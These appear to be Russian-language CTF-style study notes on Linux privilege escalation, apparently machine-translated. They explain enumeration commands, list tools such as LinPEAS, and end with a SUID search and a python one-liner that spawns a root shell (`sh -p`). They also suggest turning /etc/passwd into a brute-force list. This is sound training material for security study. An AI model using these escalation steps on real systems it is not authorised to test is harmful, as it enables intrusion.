## Enumeration
### hostname

```bash
hostname
```

Команда вернет имя хоста целевой машины. Хотя это значение можно легко изменить или иметь относительно бессмысленную строку (например, Ubuntu-3487340239), в некоторых случаях оно может предоставить информацию о роли целевой системы в корпоративной сети.

### uname -a

```bash
uname -a
```
Печатает информацию о системе, предоставляя нам дополнительные подробности о ядре, используемом системой. Это будет полезно при поиске любых потенциальных уязвимостей ядра, которые могут привести к эскалации привилегий.
### file /proc/version

```bash
cat /proc/version
```
Proc (Procfs) предоставляет информацию о целевых системных процессах. Вы найдете PROC во многих различных дистрибутивах Linux, что делает его важным инструментом для вашего арсенала.

Глядя на `/proc/version` может предоставить вам информацию о версии ядра и дополнительных данных, таких как установлен ли компилятор (например, GCC).

### file /etc/issue

Системы также могут быть идентифицированы, посмотрев на файл `/etc/issue`. Этот файл обычно содержит некоторую информацию о операционной системе, но может быть легко настроен или изменен. Находясь на предмет, любой файл, содержащий системную информацию, может быть настроен или изменен. Для более четкого понимания системы всегда полезно смотреть на все это.
### ps

А `ps` командование это эффективный способ увидеть процессы работы в системе Linux . Набор `ps` На вашем терминале будет отображаться процессы для текущего оболочка.

Вывод `ps` (Статус процесса) покажет следующее;

- PID: идентификатор процесса (уникальный для процесса)
- TTY: тип терминала, используемый пользователем
- Время: количество времени процессора, используемого в процессе (это не время, для которого этот процесс работал)
- CMD: команда или исполняемая работа (не будет отображать параметр командной строки)

Команда «PS» предоставляет несколько полезных вариантов.

- `ps -A`: Просмотреть все процессы работы
- `ps axjf`: Просмотреть дерево процессов (см. Формирование дерева, пока `ps axjf` запускается ниже)

![](https://i.imgur.com/xsbohSd.png)  

- `ps aux`: `aux` Опция будет отображать процессы для всех пользователей (A), отобразить пользователя, который запустил процесс (U) и показывает процессы, которые не прикреплены к терминалу (x). Глядя на вывод команды PS AUX, мы можем лучше понять систему и потенциальную уязвимость.

### env

А `env` Команда покажет переменные окружающей среды.

![](https://i.imgur.com/LWdJ8Fw.png)

Переменная Path может иметь компилятор или язык сценариев (например, Python), который может использоваться для запуска кода в целевой системе или использовано для эскалации привилегий.
### sudo -l

Целевая система может быть настроена, чтобы позволить пользователям запускать некоторые (или все) команды с привилегиями Root. А `sudo -l` Команда может использоваться для перечисления всех команд, которые ваш пользователь может запустить, используя `sudo`Полем
### id

А `id` командование предоставит общий обзор уровня привилегий пользователя и Групповое членство.

Стоит помнить, что `id` Команда также может быть использована для получения той же информации для другого пользователя, как показано ниже.

![](https://i.imgur.com/YzfJliG.png)
### /etc/passwd

Чтение `/etc/passwd` файл Может быть простым способом обнаружить пользователей в системе.

![](https://i.imgur.com/r6oYOEi.png)

Хотя выход может быть длинным и немного пугающим, он может быть легко Вырезать и преобразовать в полезный список для атак грубой силы.

![](https://i.imgur.com/cpS2U93.png)  

Помните, что это вернет всех пользователей, некоторые из которых являются системой или Пользователи службы, которые были бы не очень полезны. Другой подход мог быть `grep` для «home», так как у реальных пользователей, скорее всего, будут свои Папки под каталогом «home».

![](https://i.imgur.com/psxE6V4.png)
### history

Команда `history` может дать нам представление о целевой системе, хотя редко хранит информацию, такую ​​как пароли или имена пользователей.

### ifconfig
Целевая система Может быть, точка поворота в другую сеть. А `ifconfig` Команда предоставит нам информацию о сетевых интерфейсах система. Пример ниже показан в целевой системе три Интерфейсы (ETH0, TUN0 и TUN1). Наша атакующая машина может достичь интерфейс ETH0, но не может напрямую получить доступ к двум другим сети.  

![](https://i.imgur.com/hcdZnwK.png)

Это можно подтвердить, используя `ip route` командовать, чтобы увидеть, что Сетевые маршруты существуют.  

![](https://i.imgur.com/PSrmz5O.png)
### netstat

После начального Проверьте наличие существующих интерфейсов и сетевых маршрутов, стоит искать в существующие сообщения. А `netstat` Команда может быть использована с несколькими различными вариантами сбора информации о существующих соединения.

  

- `netstat -a`: шоу Все порты прослушивания и установленные соединения.
- `netstat -at` или `netstat -au` Также можно использовать для перечисления TCP или UDP протоколов соответственно.
- `netstat -l`: список Порты в режиме «прослушивание». Эти порты открыты и готовы к Принять входящие соединения. Это можно использовать с опцией «t» Чтобы перечислить только порты, которые слушают, используя протокол TCP (ниже)


![](https://i.imgur.com/BbLdyrr.png)  

- `netstat -s`: Список статистики использования сети по протоколу (ниже) также можно использовать с `-t` или `-u` варианты ограничения вывод в конкретный протокол.

![](https://i.imgur.com/mc8OWP0.png)

- `netstat -tp`: Список подключений с названием службы и PID информация.

![](https://i.imgur.com/fDYQwbW.png)

Это также можно использовать с `-l` вариант перечисления портов прослушивания (ниже)

![](https://i.imgur.com/JK7DNv0.png)

Мы видим, что столбец « ПИД /Имя программы» пуст, как этот процесс принадлежит другому пользователю.

Ниже то же самое команда запускается с привилегиями ROOT и раскрывает эту информацию как 2641/nc (netcat)

![](https://i.imgur.com/FjZHqlY.png)

- `netstat -i`: Показывает статистику интерфейса. Ниже мы видим этот «eth0» и «TUN0» более активны, чем «TUN1».

![](https://i.imgur.com/r6IjpmZ.png)  

А `netstat` Использование, вероятно, чаще всего увидите в сообщениях в блоге, записях и курсах `netstat -ano` который можно сломать вниз следующим образом;

- `-a`: Отображать все гнезда
- `-n`: Не решайте имена
- `-o`: Отображение таймеров  

![](https://i.imgur.com/UxzLBRw.png)
### find

Поиск целевой системы для важной информации и Потенциальные привилегии векторов могут быть плодотворными. Встроенный Команда «Найти» полезна и стоит сохранить в вашем арсенале.

Ниже приведены некоторые полезные примеры для команды «Найти».

**Найти файлы:**

- `find . -name flag1.txt`: найти файл с именем «flag1.txt» в Текущий каталог
- `find /home -name flag1.txt`: Найти имена файлов «flag1.txt» в /домашний каталог
- `find / -type d -name config`: Найдите каталог с именем config в разделе «/»
- `find / -type f -perm 0777`: Найти файлы с разрешениями 777 (файлы читаемые, записываемые и исполняемые для всех пользователей)
- `find / -perm a=x`: Найти исполняемые файлы
- `find /home -user frank`: Найти все файлы для пользователя «Frank» под "/дом"
- `find / -mtime 10`: Найти файлы, которые были изменены в последних 10 дни
- `find / -atime 10`: Найти файлы, доступные к последним 10 день
- `find / -cmin -60`: Найти файлы, измененные в течение последнего часа (60 минута)
- `find / -amin -60`: Найти доступ к файлам в течение последнего часа (60 минута)
- `find / -size 50M`: Найти файлы с размером 50 МБ

Эта команда также может использоваться с (+) и (-) знаками, чтобы указать Файл, который больше или меньше данного размера.

![](https://i.imgur.com/pSMfoz4.png)

А Пример выше возвращает файлы, которые превышают 100 МБ. Это важно отметить, что команда «Найти» имеет тенденцию генерировать Ошибки, которые иногда затрудняют чтение вывода. Вот почему это Было бы разумно использовать команду «Найти» с «-type f 2>/dev/null », чтобы перенаправить ошибки в«/dev/null »и иметь Чистый выход (ниже).

![](https://i.imgur.com/UKYSdE3.png)

  

Папки и файлы, которые могут быть записаны или выполнены из:

- `find / -writable -type d 2>/dev/null` : Найдите мировое написание папки
- `find / -perm -222 -type d 2>/dev/null`: Найдите мировое написание папки
- `find / -perm -o w -type d 2>/dev/null`: Найдите мировое написание папки

Причина, по которой мы видим три разные команды «находить», которые могли бы потенциально привести к тому же результату, что можно увидеть в руководстве документ. Как вы можете видеть ниже, Pomm Parameter влияет на путь «Найти» работает.

![](https://i.imgur.com/qb0klHH.png)  

- `find / -perm -o x -type d 2>/dev/null` : Найдите мировые папки

Найдите инструменты разработки и поддерживаемые языки:

- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

Найдите конкретные разрешения на файл:

Ниже приведен короткий пример, используемый для поиска файлов, в которых есть бит Suid набор. Бит SUID позволяет файлу запускать с уровнем привилегий аккаунта, которая его владеет, а не с учетной записью, которая его запускает. Это допускает интересный путь эскалации привилегий, мы увидим более подробную информацию о задаче 6. Приведенный ниже пример приведен для завершения предмета на «Найти» командование

- `find / -perm -u=s -type f 2>/dev/null`: Найти файлы с Suid бит, который позволяет нам запустить файл с более высоким уровнем привилегий чем текущий пользователь.

### Auto enumeration

Несколько инструментов могут помочь вам сэкономить время во время перечисления процесс. Эти инструменты следует использовать только для экономии времени, зная, что они может пропустить некоторые привилегии эскалационных векторов. Ниже приведен список Популярные инструменты перечисления Linux со ссылками на соответствующий GitHub Репозитории.

Среда целевой системы будет влиять на инструмент, который вы будете иметь возможность использовать. Например, вы не сможете запустить инструмент Написано на Python, если он не установлен в целевой системе. Этот Поэтому было бы лучше познакомиться с несколькими, а не Наличие одного инструмента.

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

## SUID

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

##### python

```bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

## Capabilities

## Cron jobs

## PATH

